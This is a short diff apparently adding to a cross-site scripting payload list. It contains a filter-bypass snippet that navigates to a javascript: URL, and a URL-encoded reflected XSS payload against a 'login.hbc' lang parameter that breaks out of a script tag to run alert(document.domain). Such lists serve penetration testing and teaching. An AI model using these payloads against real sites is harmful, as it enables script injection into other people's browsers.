@@ -30,3 +30,9 @@ x=/alert/.source+x+1337+x
 // set javascript url to execute alert(1337)
 location=/javascript:/ssource+x
 ```
+
+```url
+login.hbc?lang=%3C/SCRIPT%3E%3CSCRIPT%3Ealert(document.domain);%3C/SCRIPT%3E
+
+</SCRIPT><SCRIPT>alert(document.domain);</SCRIPT>
+```
